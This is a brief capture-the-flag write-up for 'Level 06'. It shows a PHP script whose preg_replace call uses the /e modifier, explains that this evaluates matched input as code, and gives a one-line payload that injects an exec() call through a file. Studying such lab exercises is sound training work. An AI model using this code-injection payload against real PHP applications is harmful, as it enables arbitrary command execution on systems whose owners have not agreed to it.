# Level 06

```
./level06
./level06 file
# So it prints the content of the file
```

http://beautifytools.com/php-beautifier.php

```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The vulnerability seems to come from the /e https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier

= PHP code within your regular expression.

https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation

So if the input match `/(\[x (.*)\])` , we execute the code.

We can exec system commands with `exec()`

So

```
echo "[x {${exec(getflag)}}]" > /tmp/res
```



we get an error with the token